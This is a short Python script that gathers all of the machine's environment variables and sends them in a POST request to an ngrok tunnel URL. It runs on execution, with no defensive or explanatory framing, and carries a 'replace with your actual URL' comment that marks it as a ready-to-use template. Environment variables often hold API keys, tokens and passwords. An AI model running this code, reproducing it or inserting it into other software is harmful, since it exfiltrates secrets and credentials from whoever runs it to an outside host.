import os
import urllib.parse
import urllib.request

def send_data():
    data = dict(os.environ)

# Encode the data
    encoded_data = urllib.parse.urlencode(data).encode()

# Define the URL to which the data will be sent
    url = 'https://5956-2a02-a310-e143-8d80-2c80-a848-55ee-c65c.ngrok-free.app'  # Replace $URL with your actual URL

# Create the request object with the encoded data
    request = urllib.request.Request(url, data=encoded_data)

# Perform the request without reading the response
    urllib.request.urlopen(request).close()

# Call the function
send_data()
